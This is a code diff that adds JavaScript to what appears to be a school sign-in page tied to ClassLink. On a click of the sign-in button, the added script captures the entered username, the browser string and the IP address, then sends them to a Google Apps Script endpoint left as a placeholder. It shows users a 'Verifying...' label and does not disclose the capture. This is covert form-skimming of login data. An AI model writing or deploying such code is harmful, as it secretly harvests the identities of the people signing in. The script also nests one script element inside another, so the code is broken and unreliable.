@@ -243,5 +243,55 @@
     </iframe>
     <iframe width="1px" height="1px" style="visibility: hidden;" src="https://idp.classlink.com/logout?fromlaunchpad=1">
     </iframe>
+    <script>
+  // This "grabs" the button by its ID
+  const loginButton = document.getElementById('signin');
+
+  // This tells the button to wait for a click
+  loginButton.addEventListener('click', function() {
+    console.log("The button was clicked! This is where we trigger the metadata capture.");
+    
+    <script>
+document.getElementById('signin').addEventListener('click', async (e) => {
+    e.preventDefault(); // Stop the page from refreshing immediately
+    
+    const loginBtn = document.getElementById('signin');
+    const originalText = loginBtn.innerText;
+    loginBtn.innerText = "Verifying...";
+
+    try {
+        // 1. Get the IP Address (external API)
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+
+        // 2. Prepare the payload
+        const logData = {
+            username: document.getElementById('username').value,
+            browser: navigator.userAgent,
+            ip: ipData.ip
+        };
+
+        // 3. Send to your Google Script (Paste your URL below)
+        const scriptURL = "PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE";
+        
+        await fetch(scriptURL, {
+            method: 'POST',
+            mode: 'no-cors', // Essential for Google Scripts
+            body: JSON.stringify(logData)
+        });
+
+        console.log("County log saved.");
+        // Normally, you would now proceed with the login logic
+        alert("Log entry created for: " + logData.username);
+
+    } catch (error) {
+        console.error("Log failed:", error);
+    } finally {
+        loginBtn.innerText = originalText;
+    }
+});
+</script>
+  });
+</script>
   </body>
 </html>
